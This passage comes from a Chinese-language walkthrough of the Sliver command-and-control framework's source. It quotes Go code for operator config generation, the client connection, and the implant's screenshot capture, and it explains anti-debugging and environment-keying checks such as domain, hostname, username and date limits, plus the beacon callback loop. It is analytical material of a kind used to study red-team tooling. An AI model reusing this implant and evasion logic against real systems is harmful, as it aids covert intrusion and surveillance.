使⽤的是 命令 new-operator -l ip -p port-n test
会输出cfg到当前⽬录下
[server] sliver > new-operator -l ip -p port-n test 
[*] Generating new client certificate, please wait ...  
[*] Saved new client config to: /root/sliver/test_ip.cfg
命令⾏参数如下
console.App.AddCommand(&grumble.Command{ 
  Name:     consts.NewOperatorStr, 
  Help:     "Create a new operator config file", 
  LongHelp: help.GetHelpFor([]string{consts.NewOperatorStr}), 
  Flags: func(f *grumble.Flags) { 
   f.String("l", "lhost", "", "listen host") 
   f.Int("p", "lport", 31337, "listen port") 
   f.String("s", "save", "", "directory/file to the binary to") 
   f.String("n", "name", "", "operator name") 
  }, 
  Run: func(ctx *grumble.Context) error { 
   fmt.Println() 
   newOperatorCmd(ctx) 
   fmt.Println() 
   return nil 
  }, 
  HelpGroup: consts.MultiplayerHelpGroup, 
 })
默认配置的监听端⼝也就是31337 同 多⼈模式监听的端⼝
最终调⽤⽣成的是newOperatorCmd ⾥⾯调⽤的是 NewOperatorConfig 返回config json
1. 判断创建的配置名称是否合法 仅限字⺟数字
2. 配置名称是唯⼀标识必须设置 并且监听的ip也需要设置
3. models.GenerateOperatorToken() ⽣成token 使⽤rand.Read的⽅式⽣成随机字符串token
4. ⽤⽣成的token 进⾏ sha256 加密
5. 将名称和sha2576加密的token存储到数据库
sliver 简单使⽤及源码浅析
11
6. 根据配置名称 ⽣成CA证书 返回公私钥
7. 创建证书 所有的这些参数就作为配置返回
// NewOperatorConfig - Generate a new player/client/operator configuration 
func NewOperatorConfig(operatorName string, lhost string, lport uint16) ([]byte, error) { 
 if !namePattern.MatchString(operatorName) { 
  return nil, errors.New("Invalid operator name (alphanumerics only)") 
 } 
 if operatorName == "" { 
  return nil, errors.New("Operator name required") 
 } 
 if lhost == "" { 
  return nil, errors.New("Invalid lhost") 
 } 
 rawToken := models.GenerateOperatorToken() 
 digest := sha256.Sum256([]byte(rawToken)) 
 dbOperator := &models.Operator{ 
  Name:  operatorName, 
  Token: hex.EncodeToString(digest[:]), 
 } 
 err := db.Session().Save(dbOperator).Error 
 if err != nil { 
  return nil, err 
 } 
 publicKey, privateKey, err := certs.OperatorClientGenerateCertificate(operatorName) 
 if err != nil { 
  return nil, fmt.Errorf("Failed to generate certificate %s", err) 
 } 
 caCertPEM, _, _ := certs.GetCertificateAuthorityPEM(certs.OperatorCA) 
 config := ClientConfig{ 
  Operator:      operatorName, 
  Token:         rawToken, 
  LHost:         lhost, 
  LPort:         int(lport), 
  CACertificate: string(caCertPEM), 
  PrivateKey:    string(privateKey), 
  Certificate:   string(publicKey), 
 } 
 return json.Marshal(config) 
}
client 客户端
client开始执⾏也是先初始化随机种⼦
然后指定配置⽂件后 使⽤mtls连接sliver server
验证成功后使⽤grpc的⽅式通信
var rootCmd = &cobra.Command{ 
 Use:   "sliver-client", 
 Short: "", 
 Long:  ``, 
 Run: func(cmd *cobra.Command, args []string) { 
  appDir := assets.GetRootAppDir() 
  logFile := initLogging(appDir) 
  defer logFile.Close() 
  os.Args = os.Args[:1] // Stops grumble from complaining 
  err := StartClientConsole() 
  if err != nil { 
   fmt.Printf("[!] %s\n", err) 
  } 
 }, 
}
sliver 简单使⽤及源码浅析
12
根据配置建⽴连接
// StartClientConsole - Start the client console 
func StartClientConsole() error { 
 configs := assets.GetConfigs() 
 if len(configs) == 0 { 
  fmt.Printf("No config files found at %s (see --help)\n", assets.GetConfigDir()) 
  return nil 
 } 
 config := selectConfig() 
 if config == nil { 
  return nil 
 } 
 fmt.Printf("Connecting to %s:%d ...\n", config.LHost, config.LPort) 
 rpc, ln, err := transport.MTLSConnect(config) 
 if err != nil { 
  fmt.Printf("Connection to server failed %s", err) 
  return nil 
 } 
 defer ln.Close() 
 return console.Start(rpc, command.BindCommands, func(con *console.SliverConsoleClient) {}, false) 
}
后续的流程跟server很类似了
implant  植⼊端
所有最终实现的⽅法都在这⾥定义实现
server定义pb规范和接⼝给客户端通信 客户端定义参数
这⾥所有的go⽂件都是模板的概念可以在⾥⾯处理代码的⼀些调整 ⽐如控制debug信息的输出
beacon 通信相关的代码在这⾥ implant/sliver/transports
截图
这⾥以windows举例
代码路径在 implant/sliver/screen/screenshot_windows.go
通过第三⽅库 github.com/kbinani/screenshot 来实现截图
import ( 
 "bytes" 
 "image/png" 
 //{{if .Config.Debug}} 
 "log" 
 //{{end}} 
 screen "github.com/kbinani/screenshot" 
) 
//Screenshot - Retrieve the screenshot of the active displays 
func Screenshot() []byte { 
 return WindowsCapture() 
} 
// WindowsCapture - Retrieve the screenshot of the active displays 
func WindowsCapture() []byte { 
 nDisplays := screen.NumActiveDisplays() 
 var height, width int = 0, 0 
 for i := 0; i  height { 
   height = rect.Dy() 
  } 
  width += rect.Dx() 
 } 
 img, err := screen.Capture(0, 0, width, height) 
 //{{if .Config.Debug}} 
 log.Printf("Error Capture: %s", err) 
 //{{end}} 
 var buf bytes.Buffer 
 if err != nil { 
  //{{if .Config.Debug}} 
  log.Println("Capture Error") 
  //{{end}} 
  return buf.Bytes() 
 } 
 png.Encode(&buf, img) 
 return buf.Bytes() 
}
sliver 植⼊端 main函数
1. 配置是否⽇志输出及输出的⽇志格式 不输出的话设置⽇志格式为空 且使⽤ ioutil.Discard将⽇志输出指向 空 可以理解为指向 
/dev/null
2. 检测是否限制执⾏   可以看下⾯的环境执⾏限制检测
3.  判断实现需要注册成windows服务 使⽤ golang.org/x/sys/windows/svc 的Run⽅法实现
4. 判断是否是beacon 的话 调⽤ beaconStartup⽅法 否则是会话模式 启动 sessionStartup
func main() { 
 // {{if .Config.Debug}} 
 log.SetFlags(log.LstdFlags | log.Lshortfile) 
 // {{else}} 
 log.SetFlags(0) 
 log.SetOutput(ioutil.Discard) 
 // {{end}} 
 // {{if .Config.Debug}} 
 log.Printf("Hello my name is %s", consts.SliverName) 
 // {{end}} 
 limits.ExecLimits() // Check to see if we should execute 
 // {{if .Config.IsService}} 
 svc.Run("", &sliverService{}) 
 // {{else}} 
 // {{if .Config.IsBeacon}} 
 beaconStartup() 
 // {{else}} ------- IsBeacon/IsSession ------- 
 sessionStartup() 
 // {{end}} 
 // {{end}} ------- IsService ------- 
}
受害机环境执⾏限制检测
implant/sliver/limits/limits.go
1.  PlatformLimits 通过 kernel32.dll IsDebuggerPresent判断是否被调试 调试则退出 
2. isDomainJoined判断是否在域⾥不在则退出(配置⽂件控制是否检测) 
sliver 简单使⽤及源码浅析
14
3. 判断hostname是否过滤是否是开启hostname检测的 跟配置⽂件的不⼀致则退出 
4. 判断主机⽤户名是否是配置的 开启判断如果与配置不⼀致则退出 如果⽤户名的数量等于并且第⼆个⽤户名是配置⽂件不⼀致则退
出
5. 如果受害机当前时间⼩于 配置⽂件的指定时间否则退出 
6. 有这个⽂件 LimitFileExists 的机器才会执⾏ 如果配置⽂件开启了判断  这个⽂件到底是啥⽂件默认是空的字符串 默认也是不开启
的 所以到底是啥⽂件就是⾃⼰指定了
func ExecLimits() { 
 // {{if not .Config.Debug}} 
 // Disable debugger check in debug mode, so we can attach to the process 
 PlatformLimits() // Anti-debug & other platform specific evasion 
 // {{end}} 
 // {{if .Config.LimitDomainJoined}} 
 ok, err := isDomainJoined() 
 if err == nil && !ok { 
  os.Exit(1) 
 } 
 // {{end}} 
 // {{if .Config.LimitHostname}} 
 hostname, err := os.Hostname() 
 if err == nil && strings.ToLower(hostname) != strings.ToLower("{{.Config.LimitHostname}}") { 
  // {{if .Config.Debug}} 
  log.Printf("%#v != %#v", strings.ToLower(hostname), strings.ToLower("{{.Config.LimitHostname}}")) 
  // {{end}} 
  os.Exit(1) 
 } 
 // {{end}} 
 // {{if .Config.LimitUsername}} 
 currentUser, _ := user.Current() 
 if runtime.GOOS == "windows" { 
  username := strings.Split(currentUser.Username, "\\") 
  if len(username) == 2 && username[1] != "{{.Config.LimitUsername}}" { 
   // {{if .Config.Debug}} 
   log.Printf("%#v != %#v", currentUser.Name, "{{.Config.LimitUsername}}") 
   // {{end}} 
   os.Exit(1) 
  } 
 } else if currentUser.Name != "{{.Config.LimitUsername}}" { 
  // {{if .Config.Debug}} 
  log.Printf("%#v != %#v", currentUser.Name, "{{.Config.LimitUsername}}") 
  // {{end}} 
  os.Exit(1) 
 } 
 // {{end}} 
 // {{if .Config.LimitDatetime}} "2014-11-12T11:45:26.371Z" 
 expiresAt, err := time.Parse(time.RFC3339, "{{.Config.LimitDatetime}}") 
 if err == nil && time.Now().After(expiresAt) { 
  // {{if .Config.Debug}} 
  log.Printf("Timelimit %#v expired", "{{.Config.LimitDatetime}}") 
  // {{end}} 
  os.Exit(1) 
 } 
 // {{end}} 
 // {{if .Config.LimitFileExists}} 
 if _, err := os.Stat(`{{.Config.LimitFileExists}}`); err != nil { 
  // {{if .Config.Debug}} 
  log.Printf("Error statting %s: %s", `{{.Config.LimitFileExists}}`, err) 
  // {{end}} 
  os.Exit(1) 
 } 
 // {{end}} 
 // {{if .Config.Debug}} 
 log.Printf("Limit checks completed") 
 // {{end}} 
 os.Executable() // To avoid any "os unused" errors 
}
sliver 简单使⽤及源码浅析
15
上述判断限制的输⼊端在这⾥ 默认的基本都是空也就是⼤部分没有做限制
client/command/commands.go#1270
f.String("w", "limit-datetime", "", "limit execution to before datetime") 
f.Bool("x", "limit-domainjoined", false, "limit execution to domain joined machines") 
f.String("y", "limit-username", "", "limit execution to specified username") 
f.String("z", "limit-hostname", "", "limit execution to specified hostname") 
f.String("F", "limit-fileexists", "", "limit execution to hosts with this file in the filesystem")
beacon模式
1. 针对不同的beacon通信⽅式建⽴连接 (transports.StartBeaconLoop)
2. 发送注册信息 上报注册事件 (beaconMainLoop)
3. 解析服务端数据 定时任务阻塞 遍历tasks执⾏最后上传结果
func beaconStartup() { 
 // {{if .Config.Debug}} 
 log.Printf("Running in Beacon mode with ID: %s", InstanceID) 
 // {{end}} 
 abort := make(chan struct{}) 
 defer func() { 
  abort <- struct{}{} 
 }() 
 beacons := transports.StartBeaconLoop(c2Servers, abort) 
 for beacon := range beacons { 
  // {{if .Config.Debug}} 
  log.Printf("Next beacon = %v", beacon) 
  // {{end}} 
  if beacon != nil { 
   err := beaconMainLoop(beacon) 
   if err != nil { 
    connectionErrors++ 
    if transports.GetMaxConnectionErrors() < connectionErrors { 
     return 
    } 
   } 
  } 
  reconnect := transports.GetReconnectInterval() 
  // {{if .Config.Debug}} 
  log.Printf("Reconnect sleep: %s", reconnect) 
  // {{end}} 
  time.Sleep(reconnect) 
 } 
}
session模式
会话模式代码与beacon模式类似
func sessionStartup() { 
 // {{if .Config.Debug}} 
 log.Printf("Running in session mode") 
 // {{end}} 
 abort := make(chan struct{}) 